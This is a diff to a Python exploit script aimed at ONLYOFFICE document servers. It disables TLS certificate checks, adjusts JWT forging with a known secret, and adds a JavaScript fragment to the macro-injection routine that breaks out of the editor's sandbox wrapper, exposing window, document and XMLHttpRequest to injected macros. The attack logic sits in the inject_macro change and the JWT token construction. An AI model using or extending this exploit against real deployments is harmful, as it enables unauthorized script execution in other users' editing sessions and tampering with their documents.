@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 # Exploit ONLYOFFICE implementations
 
-import argparse, sys, re, time, signal, requests, uuid, json, tempfile, os, subprocess, websocket, base64, threading, hashlib, datetime, traceback, jwt, shutil, multiprocessing
+import argparse, sys, re, time, signal, requests, uuid, json, tempfile, os, subprocess, websocket, base64, threading, hashlib, datetime, traceback, jwt, shutil, multiprocessing, ssl
 import http.server
 import socketserver
 from urllib.parse import urlparse, parse_qs
@@ -138,7 +138,7 @@ class WsClient():
     if 'websocket' not in self.url: self.url = self.url + path
 
     if self.output: print( 'Connecting to', self.url )
-    self.ws = websocket.create_connection( self.url )
+    self.ws = websocket.create_connection( self.url, sslopt={'cert_reqs': ssl.CERT_NONE} )
 
     # Spawn socket listener
     self.spawn_listener()
@@ -426,7 +426,7 @@ class WsClient():
     iat = int( time.time() )
     exp = iat + 1000
     body = {"document":{"key":self.docid,"permissions":data['permissions']},"editorConfig":{"user":{"id":"uid-1","name":self.username,"index":1},"ds_view":False,"ds_isCloseCoAuthoring":False,"ds_denyChangeName":True},"iat":time.time(),"exp":time.time() + 1000}
-    jwtstr = jwt.encode( body, self.jwtsecret, algorithm='HS256' ).decode('utf8')
+    jwtstr = jwt.encode( body, self.jwtsecret, algorithm='HS256' )
     return jwtstr
 
   def change_doc_info( self ):
@@ -529,6 +529,12 @@ class WsClient():
     self.send( message )
 
   def inject_macro( self, macrotxt ):
+    macrotxt += '''
+      // Escape from object hooking bit
+      })( window.g_asc_plugins.api, window, alert, document, XMLHttpRequest );
+
+      // Make it syntax safe
+      (function(a,b,c,d,e){'''
     payload = json.dumps({
       "macrosArray":[{
         "name":"Macro 1",
